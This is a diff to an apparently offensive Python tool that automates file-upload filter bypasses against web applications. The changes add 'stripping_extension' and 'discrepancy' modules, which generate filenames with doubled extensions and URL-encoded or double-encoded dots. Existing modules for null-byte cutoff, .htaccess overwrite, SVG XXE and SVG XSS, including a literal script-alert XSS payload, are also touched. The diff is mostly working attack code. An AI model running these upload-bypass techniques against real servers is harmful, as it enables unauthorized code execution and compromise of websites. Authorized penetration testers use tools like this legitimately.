@@ -33,7 +33,7 @@ def extension_shuffle(request_file, options, allowed_extension, function_number,
             # Calculate the progress bar according to the number of functions and iterations
             internal_progress += 1
             overall_progress = (function_number - 1) / total_functions * 100 + (
-                        internal_progress / internal_total_iterations) / total_functions * 100
+                    internal_progress / internal_total_iterations) / total_functions * 100
 
             # A state condition to remove extensions that the program already checked
             if leftover_extensions is not None and backend_extension in leftover_extensions:
@@ -82,7 +82,7 @@ def double_extension(request_file, options, allowed_extension, function_number, 
             # Calculate the progress bar according to the number of functions and iterations
             internal_progress += 1
             overall_progress = (function_number - 1) / total_functions * 100 + (
-                        internal_progress / internal_total_iterations) / total_functions * 100
+                    internal_progress / internal_total_iterations) / total_functions * 100
 
             # A state condition to remove extensions that the program already checked
             if leftover_extensions is not None and backend_extension in leftover_extensions:
@@ -130,7 +130,7 @@ def forward_double_extension(request_file, options, allowed_extension, function_
             # Calculate the progress bar according to the number of functions and iterations
             internal_progress += 1
             overall_progress = (function_number - 1) / total_functions * 100 + (
-                        internal_progress / internal_total_iterations) / total_functions * 100
+                    internal_progress / internal_total_iterations) / total_functions * 100
 
             # A condition for a resume state
             if leftover_extensions is not None and backend_extension in leftover_extensions:
@@ -171,7 +171,7 @@ def reverse_double_extension(request_file, options, allowed_extension, function_
             # Calculate the progress bar according to the number of functions and iterations
             internal_progress += 1
             overall_progress = (function_number - 1) / total_functions * 100 + (
-                        internal_progress / internal_total_iterations) / total_functions * 100
+                    internal_progress / internal_total_iterations) / total_functions * 100
 
             # A state condition to remove extensions that the program already checked
             if leftover_extensions is not None and backend_extension in leftover_extensions:
@@ -179,6 +179,105 @@ def reverse_double_extension(request_file, options, allowed_extension, function_
 
             # Send a request
             file_extension = f".{backend_extension}.{allowed_extension}"
+            file_name = generate_random_string(10) + file_extension
+            _, _ = send_request(backend_extension, request_file, file_name, extension_to_test, options, module,
+                                allowed_extension, overall_progress)
+
+    except KeyboardInterrupt:
+        # Save the state when keyboard exception is caught
+        if len(state_extensions) > 0:
+            save_state(options, module, allowed_extension, function_number, internal_progress,
+                       internal_total_iterations, total_functions, state_extensions)
+
+
+def stripping_extension(request_file, options, allowed_extension, function_number, total_functions,
+                        internal_progress=None,
+                        internal_total_iterations=None, leftover_extensions=None):
+    # Save module name and extensions for a state file
+    module = "stripping_extension"
+    state_extensions = []
+
+    try:
+        info("Executing Stripping Extension module.")
+        extension_to_test = options.file_extension
+
+        internal_total_iterations = len(config.extensions[extension_to_test])
+
+        internal_progress = 0
+
+        for backend_extension in config.extensions[extension_to_test]:
+
+            # Collect extensions for a resume state
+            state_extensions.append(backend_extension)
+
+            # Calculate the progress bar according to the number of functions and iterations
+            internal_progress += 1
+            overall_progress = (function_number - 1) / total_functions * 100 + (
+                    internal_progress / internal_total_iterations) / total_functions * 100
+
+            # A state condition to remove extensions that the program already checked
+            if leftover_extensions is not None and backend_extension in leftover_extensions:
+                continue
+
+            # Send a request
+            # Ex: exploit.p.phphp will be after stripping exploit.php
+            file_extension = f".{backend_extension[0]}.{backend_extension}{backend_extension[1:]}"
+            file_name = generate_random_string(10) + file_extension
+            _, _ = send_request(backend_extension, request_file, file_name, extension_to_test, options, module,
+                                allowed_extension, overall_progress, backend_extension)
+
+            # Ex: exploit.pphphp will be after stripping exploit.php
+            file_extension = f".{backend_extension[0]}{backend_extension}{backend_extension[1:]}"
+            file_name = generate_random_string(10) + file_extension
+            _, _ = send_request(backend_extension, request_file, file_name, extension_to_test, options, module,
+                                allowed_extension, overall_progress, backend_extension)
+
+    except KeyboardInterrupt:
+        # Save the state when keyboard exception is caught
+        if len(state_extensions) > 0:
+            save_state(options, module, allowed_extension, function_number, internal_progress,
+                       internal_total_iterations, total_functions, state_extensions)
+
+
+def discrepancy(request_file, options, allowed_extension, function_number, total_functions, internal_progress=None,
+                internal_total_iterations=None, leftover_extensions=None):
+    # Save module name and extensions for a state file
+    module = "discrepancy"
+    state_extensions = []
+
+    try:
+        info("Executing Discrepancy module.")
+        extension_to_test = options.file_extension
+
+        internal_total_iterations = len(config.extensions[extension_to_test])
+
+        internal_progress = 0
+
+        for backend_extension in config.extensions[extension_to_test]:
+
+            # Collect extensions for a resume state
+            state_extensions.append(backend_extension)
+
+            # Calculate the progress bar according to the number of functions and iterations
+            internal_progress += 1
+            overall_progress = (function_number - 1) / total_functions * 100 + (
+                    internal_progress / internal_total_iterations) / total_functions * 100
+
+            # A state condition to remove extensions that the program already checked
+            if leftover_extensions is not None and backend_extension in leftover_extensions:
+                continue
+
+            # Send a request
+            # Replacing a dot with a URL encode
+            file_extension = f".{backend_extension}"
+            file_extension = file_extension.replace(".", r"%2e")
+            file_name = generate_random_string(10) + file_extension
+            _, _ = send_request(backend_extension, request_file, file_name, extension_to_test, options, module,
+                                allowed_extension, overall_progress)
+
+            # Replacing a dot with a double URL encode
+            file_extension = f".{backend_extension}"
+            file_extension = file_extension.replace(".", r"%252e")
             file_name = generate_random_string(10) + file_extension
             _, _ = send_request(backend_extension, request_file, file_name, extension_to_test, options, module,
                                 allowed_extension, overall_progress)
@@ -218,7 +317,8 @@ def null_byte_cutoff(request_file, options, allowed_extension, function_number, 
             internal_progress_increment = (100 / total_functions) / internal_total_iterations
 
             # Calculate the initial progress for this internal iteration
-            start_progress = (function_number - 1) / total_functions * 100 + internal_progress * internal_progress_increment
+            start_progress = (
+                                         function_number - 1) / total_functions * 100 + internal_progress * internal_progress_increment
 
             # A state condition to remove extensions that the program already checked
             if leftover_extensions is not None and backend_extension in leftover_extensions:
@@ -230,7 +330,7 @@ def null_byte_cutoff(request_file, options, allowed_extension, function_number, 
                 # Increment null bytes progress
                 null_progress += 1
                 overall_progress = start_progress + (
-                            null_progress / null_total_iterations) * internal_progress_increment
+                        null_progress / null_total_iterations) * internal_progress_increment
 
                 # Send the request
                 file_extension = f".{backend_extension}{null_byte}.{allowed_extension}"
@@ -272,7 +372,7 @@ def name_overflow_cutoff(request_file, options, allowed_extension, function_numb
             # Calculate the progress bar according to the number of functions and iterations
             internal_progress += 1
             overall_progress = (function_number - 1) / total_functions * 100 + (
-                        internal_progress / internal_total_iterations) / total_functions * 100
+                    internal_progress / internal_total_iterations) / total_functions * 100
 
             # A state condition to remove extensions that the program already checked
             if leftover_extensions is not None and backend_extension in leftover_extensions:
@@ -295,8 +395,7 @@ def name_overflow_cutoff(request_file, options, allowed_extension, function_numb
                        internal_total_iterations, total_functions, state_extensions)
 
 
-def htaccess_overwrite(request_file, options, allowed_extension, function_number, total_functions,
-                       internal_progress=None, internal_total_iterations=None, leftover_extensions=None):
+def htaccess_overwrite(request_file, options, allowed_extension, function_number, total_functions):
     extension_to_test = options.file_extension
     module = 'htaccess_overwrite'
     # Check if the file extension being tested is PHP (it works only with php)
@@ -340,11 +439,11 @@ def htaccess_overwrite(request_file, options, allowed_extension, function_number
             warning(f"Trying to upload {file_name}")
             time.sleep(1.5)
             _, upload_status, _, _, _, _, _ = file_upload(request_file, file_name, extension_to_test, options,
-                                                          magic_bytes, allowed_extension, mimetype, module, overall_progress)
+                                                          magic_bytes, allowed_extension, mimetype, module,
+                                                          overall_progress)
 
 
-def svg_xxe(request_file, options, allowed_extension, function_number, total_functions, internal_progress=None,
-            internal_total_iterations=None, leftover_extensions=None):
+def svg_xxe(request_file, options, allowed_extension, function_number, total_functions):
     module = 'svg_xxe'
 
     info("Executing XML External Entity with SVG module.")
@@ -357,7 +456,7 @@ def svg_xxe(request_file, options, allowed_extension, function_number, total_fun
     magic_bytes = False
     skip_module = True  # Do not exit when a successful upload is occurred
     file_name = generate_random_string(10) + "." + file_extension
-    with open("assets/samples/svg_xxe.svg", 'rb') as file:
+    with open("assets/samples/svg_xxe.svg", 'r') as file:
         file_data = file.read()
 
     # Upload the request with a svg data
@@ -376,6 +475,12 @@ def svg_xxe(request_file, options, allowed_extension, function_number, total_fun
             if options.upload_dir.endswith("=/"):
                 upload_dir = options.upload_dir[:-1]
             final_url = urljoin(url, upload_dir + file_name)
+
+            if "https://" in final_url:
+                final_url = final_url.replace("https", options.protocol)
+            else:
+                final_url = final_url.replace("http", options.protocol)
+
             response, _ = send_get_request(headers, options, final_url)
 
             # Check for a root user in response
@@ -383,28 +488,27 @@ def svg_xxe(request_file, options, allowed_extension, function_number, total_fun
                 printing(options, user_options, response, file_name, 100, current_time, module, magic_bytes, mimetype)
                 success("XXE confirmed!")
                 info(f"URL: {final_url}")
-                if not options.bruteForce:
+                if not options.brute_force:
                     exit(1)
                 else:
                     return
             else:
                 printing(options, user_options, response, file_name, 100, current_time, module, magic_bytes, mimetype)
                 warning("Couldn't find XXE in response, you might want to check it manually.")
-                if not options.bruteForce:
+                if not options.brute_force:
                     exit(1)
                 else:
                     return
         else:
             printing(options, user_options, response, file_name, 100, current_time, module, magic_bytes, mimetype)
             warning("Manually check if the XXE is present in the uploaded path when accessed.")
-            if not options.bruteForce:
+            if not options.brute_force:
                 exit(1)
             else:
                 return
 
 
-def svg_xss(request_file, options, allowed_extension, function_number, total_functions, internal_progress=None,
-            internal_total_iterations=None, leftover_extensions=None):
+def svg_xss(request_file, options, allowed_extension, function_number, total_functions):
     module = 'svg_xss'
 
     info("Executing Cross-Site Scripting with SVG module.")
@@ -416,7 +520,7 @@ def svg_xss(request_file, options, allowed_extension, function_number, total_fun
     mimetype = config.mimetypes["svg"]
     magic_bytes = False
     file_name = generate_random_string(10) + "." + file_extension
-    with open("assets/samples/svg_xss.svg", 'rb') as file:
+    with open("assets/samples/svg_xss.svg", 'r') as file:
         file_data = file.read()
 
     xss_payload = "<script type=\"text/javascript\">alert(\"document.domain\");</script>"  # XSS payload to check in the response
@@ -437,6 +541,12 @@ def svg_xss(request_file, options, allowed_extension, function_number, total_fun
             if options.upload_dir.endswith("=/"):
                 upload_dir = options.upload_dir[:-1]
             final_url = urljoin(url, upload_dir + file_name)
+
+            if "https://" in final_url:
+                final_url = final_url.replace("https", options.protocol)
+            else:
+                final_url = final_url.replace("http", options.protocol)
+                
             response, _ = send_get_request(headers, options, final_url)
             content_type = response.headers.get("Content-Type")
 
@@ -446,21 +556,21 @@ def svg_xss(request_file, options, allowed_extension, function_number, total_fun
 
                 success("XSS is reflected and confirmed!")
                 info(f"URL: {final_url}")
-                if not options.bruteForce:
+                if not options.brute_force:
                     exit(1)
                 else:
                     return
             else:
                 printing(options, user_options, response, file_name, 100, current_time, module, magic_bytes, mimetype)
                 warning("Couldn't find XSS in response, you might want to check it manually.")
-                if not options.bruteForce:
+                if not options.brute_force:
                     exit(1)
                 else:
                     return
         else:
             printing(options, user_options, response, file_name, 100, current_time, module, magic_bytes, mimetype)
             warning("Manually check if the XSS is present in the uploaded path when accessed.")
-            if not options.bruteForce:
+            if not options.brute_force:
                 exit(1)
             else:
                 return
